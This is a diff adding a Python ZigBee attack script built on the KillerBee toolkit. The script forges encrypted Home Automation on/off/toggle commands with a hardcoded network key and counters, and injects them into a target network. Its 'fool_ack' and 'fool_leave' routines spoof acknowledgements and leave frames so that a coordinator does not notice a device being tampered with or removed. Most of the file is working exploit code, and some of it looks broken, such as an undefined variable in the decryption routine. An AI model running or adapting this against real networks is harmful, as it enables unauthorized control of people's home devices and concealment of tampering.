@@ -1,0 +1,270 @@
+#!/usr/bin/python
+
+import sys
+import time
+import signal
+import binascii
+import struct
+import time
+
+from killerbee import *
+
+def usage():
+    print >>sys.stderr, """
+toggle: plays HA toggle,on,off command when provided with required PAN addr,device address, key. Currently these values need to be inserted into the code before actually running the tool. A To toggle use "./zbHAtoggle -t -f [freq] -i [device_id] -file [filename containing counter]", to switch on send "./zbHAtoggle -on -f [freq] -i [device_id] -file [filename containing counter]" and to switch off use "./zbHAtoggle -off -f [freq] -i [device_id] -file [filename containing counter]"
+
+fool_leave: fools the co-ordinator into believing that the device still exists. Useful when tampering an existing device and taking it off.
+Needs to be provided PANID, Device, and ID of the attacking tool obtained from zbid in the code. "./zbHAtoggle -fl -f [freq] -i [device_id] "
+
+The next release will try to fix the things that need to be provided manually.
+Contact: mandar.satam@gmail.com
+
+Usage: ./zbHAtoggle -h
+    """
+
+def interrupt(signum, frame):
+    global packetcount
+    global kb
+    global cap
+    kb.close()
+    if cap:
+        cap.close()
+    print "%d packets transmitted" % packetcount
+    sys.exit(0)
+
+def ack_response_handle(packet):
+    print "length of packet recv. in ack_handle: %s" %(len(packet))      
+    print hexdump(packet)
+    if len(packet) == 12:
+    	if str(packet[0].encode("hex")) == "63":		
+    		seq_nu = packet[2] 		       
+    		return (seq_nu)
+    return None
+
+def fool_ack_response_handle(packet):
+    global arg_verbose
+    global report_csv
+    #d154 = Dot154PacketParser()
+    # Chop the packet up
+    #pktdecode = d154.pktchop(packet)
+    print "length of packet recv. in ack_handle: %s" %(len(packet))      
+    print hexdump(packet)
+    if len(packet) == 48:    			
+	seq_nu = packet[2] 		       
+	return (seq_nu)		       
+    return None
+
+def kbdecrypyt():
+	try:
+		import zigbee_crypt
+	except ImportError:
+		print "Could not import zigbee_crypt extension, cryptographic functionality is not available."
+		return None
+	
+	#worked key (big-endian) for decryption
+	big_key = "\x01\x02\x03\x04\x01\x02\x03\x04\x01\x02\x03\x04\x01\x02\x03\x04" 
+
+	#worked (little-endian) mic for decryption
+	mic = '\x18\x99\x03\xb1'
+
+	#worked (little-endian) encrypted data for decryption
+	encrypted = '\xb3\x6f\xae\x8c\x15\x55\xb3\x3f\x10\xf6\xe1'
+	
+	#worked (little-endian) Network packet for decryption also need to change the IEEE,zigbee network and security header frame counter
+	zigbeeData = '\x48\x02\x6f\x79\x00\x00\x0a\x58\x2d\x02\x01\x00\x00\x11\xd0\x11\x44\x02\xc2\x50\x00\x00' 
+	
+	#worked nonce (little-endian) for decryption, also need to change the frame counter 
+	nonce = dev_addr+"\x01\x00\x00\x00\x2d"	
+	
+	# decryption routine called
+	(payload, micCheck) = zigbee_crypt.decrypt_ccm(big_key, nonce, mic, encrypted, zigbeeData)
+
+	# Decrypted data printed 
+	print "\tDecrypted Data: " + payload.encode('hex')
+
+def HA_on_off(kb):
+	try:
+		import zigbee_crypt
+	except ImportError:
+		print "Could not import zigbee_crypt extension, cryptographic functionality is not available."
+		return None
+
+	#Assign counter values, any counter values will do, however they need to be incremented sequentially after first send or the zb devices need to be reset
+	#TODO auto-increment counters or intuit the state they should be at (replay protection...)
+	'''
+	MANDAR: Created a way so that counters are stored in a text file. An initial file needs to be provided with all counters as 0, and every counter value
+        is stored on a seperate line, as the program runs it updates the counter value sequentially thereby eliminating the need for manual changes
+	'''
+
+	lines = [line.strip() for line in open(file_name)]
+	
+	IEEE_ctr = struct.pack('B',int(lines[0]))
+	zbnwk_ctr = struct.pack('B',int(lines[1]))
+	zbsec_ctr = struct.pack('l',int(lines[2]))
+	zbaps_ctr = struct.pack('B',int(lines[3]))
+	zbHA_ctr = struct.pack('B',int(lines[4]))
+
+	f = open(file_name,'w')
+    f.write(str(int(lines[0])+1)+'\n')
+	f.write(str(int(lines[1])+1)+'\n')
+	f.write(str(int(lines[2])+1)+'\n')
+	f.write(str(int(lines[3])+1)+'\n')
+	f.write(str(int(lines[4])+1)+'\n')
+	f.close()
+
+	#Assign other required values
+	PAN_ID = "\xaa\x1a" # The PANID of the network
+	dev = '\x6f\x79' # The short address of the device which will be toggled on or off
+	
+	#worked key (big-endian) for decryption
+	big_key = "\x01\x02\x03\x04\x01\x02\x03\x04\x01\x02\x03\x04\x01\x02\x03\x04" 
+
+	# Any device address works 
+	dev_addr = '\x04\xb4\x05\xdc\x02\xc2\x51\x01'
+
+	#worked nonce (little-endian) for decryption, also need to change the frame counter 
+	nonce = dev_addr+zbsec_ctr+"\x2d"
+	
+	#worked (little-endian) Network packet for decryption also need to change the IEEE,zigbee network and security header frame counter
+	# ZigbeNetwork data for HA on/off packet
+	zigbeeData = '\x48\x02'+dev+'\x00\x00\x0a'+zbnwk_ctr+'\x2d'+zbsec_ctr+dev_addr+'\x00' 	    
+			
+	# HA profile on/off command in (little endian) decrypted data, need to change APS and Cluster frame counters
+	#MANDAR: Since toggle, on and off variable were boolean, changed the if conditions to match against boolean as opposed to string
+
+	if toggle == 1:
+		decrypted = "\x00\x08\x06\x00\x04\x01\x08"+zbaps_ctr+"\x11"+zbHA_ctr+"\x02" 	
+	if on == 1:
+		decrypted = "\x00\x08\x06\x00\x04\x01\x08"+zbaps_ctr+"\x11"+zbHA_ctr+"\x01"
+	if off == 1:
+		decrypted = "\x00\x08\x06\x00\x04\x01\x08"+zbaps_ctr+"\x11"+zbHA_ctr+"\x00"
+	
+	
+	(payload, mic) = zigbee_crypt.encrypt_ccm(big_key, nonce, 4, decrypted, zigbeeData)  
+
+	#print "All data:" + command_send.encode('hex')	
+	print "\tEncrypted Data: " + payload.encode('hex')
+	print "\tMic:            " + mic.encode('hex')	      	
+	
+	# HA on/off  packet data combined to send including IEEE command before zigbee network data for HA on/off
+	command_send = "\x61\x88"+IEEE_ctr+PAN_ID+"\x00\x00\x72\x79" + zigbeeData + payload + mic	
+
+	print "command_send:" + command_send.encode('hex')
+	kb.inject(command_send)	
+	sys.exit(1)
+	
+	# Leaving this while block as this can be helpful for reading and getting the counter values
+
+def fool_ack(kb):
+	value1 = None	
+	value2 = None
+	# While block that can help to send packets by sending acknowlegdement even when the other device has left
+	while (1):
+		# Does not block 
+		recvpkt = kb.pnext() 		
+		# Check for empty packet (timeout) and valid FCS
+		if recvpkt != None and recvpkt[1]:                
+			value1 = fool_ack_response_handle(recvpkt[0]) 			
+		if value1 != None and value2 !=value1:
+			print "seq number:%s" %(value1) 				
+			ack_resp = ("\x02\x00")+str(value1)
+			kb.sniffer_off()															
+			kb.inject(ack_resp)		
+			print "ack sent:" + ack_resp.encode('hex')
+			value2 = value1			
+
+def fool_leave(kb):
+	value1 = None
+
+	# While block that can help to send packets by sending acknowlegdement first and then HA on/off or leave packet from co-ordinator
+	while (1):
+	# Does not block 
+		recvpkt = kb.pnext() 		
+	# Check for empty packet (timeout) and valid FCS
+		if recvpkt != None and recvpkt[1]:                
+			value1 = ack_response_handle(recvpkt[0]) 			
+		if value1 != None:
+			#print "seq number:%s" %(value1) 
+			value2 = (hex(int(binascii.hexlify(value1),16) + int('0x01',16)))
+			print "new seq:" +value2	
+			#test = ("\x12\x00").encode('hex')+str(value2[2:4])
+			kb.sniffer_off()
+
+			#Arguments
+			pan_id = '\xaa\x1a' # Required pan id
+			dev = '\x6f\x79'    # Required dev														
+			while 1:
+				# IEEE command to use before zigbee network for Leave device request from device
+				command_send = '\x63\x88'.encode('hex')+str(value2[2:4])+pan_id+'\x00\x00'+dev+'\x04'.encode('hex')
+				kb.inject(binascii.unhexlify(command_send))
+				value2 = (hex(int((value2),16) + int('0x01',16)))
+				print "sent packet "+command_send
+				time.sleep(2)
+				#print "ack sent:" + ack_resp.encode('hex')
+				#print "command_send:" + command_send.encode('hex')	
+
+
+PAN_ID = None
+dev = None
+
+# Global
+packetcount = 0
+toggle = False
+on     = False
+off    = False
+foolack   = False
+foolleave = False
+file_name = None
+
+# Command line arguments
+arg_devstring = None
+arg_channel   = None
+
+while len(sys.argv) > 1:
+    op = sys.argv.pop(1)
+    if op == '-i':
+        arg_devstring = sys.argv.pop(1)
+    if op == '-f':
+        arg_channel = int(sys.argv.pop(1))
+    if op == '-p':
+	    PAN_ID = sys.argv.pop(1)
+    if op == '-file':
+	    file_name = sys.argv.pop(1)
+    if op == '-d':		
+        dev = sys.argv.pop(1)
+    if op == '-t':	
+        toggle = True
+    if op == '-on':	
+        on = True
+    if op == '-off':	
+        off = True
+    if op == '-fa':
+        foolack = True
+    if op == '-h':
+        usage()
+    if op == '-fl':
+        foolleave = True
+#TODO run the functions after all cmd line parsed and checked
+
+if arg_channel == None:
+    print >>sys.stderr, "ERROR: Must specify a channel with -f"
+    usage()
+    sys.exit(1)
+
+kb = KillerBee(device=arg_devstring)
+signal.signal(signal.SIGINT, interrupt)
+kb.set_channel(arg_channel)
+
+# Run the functions specified on the command line
+# The original code has these nonexclusive and allowing it to run multiple times, and thus I have preserved that for now:
+if toggle:
+    HA_on_off(kb)
+if on:
+    HA_on_off(kb)
+if off:
+    HA_on_off(kb)
+if foolack:
+    fool_ack(kb)
+if foolleave:
+    fool_leave(kb)
+
